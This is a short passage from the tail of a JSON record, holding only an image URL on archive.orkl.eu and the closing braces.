        "img": "https://archive.orkl.eu/06224e369906b48f6a86fe582304ef2df3d4436c.jpg"
    }
}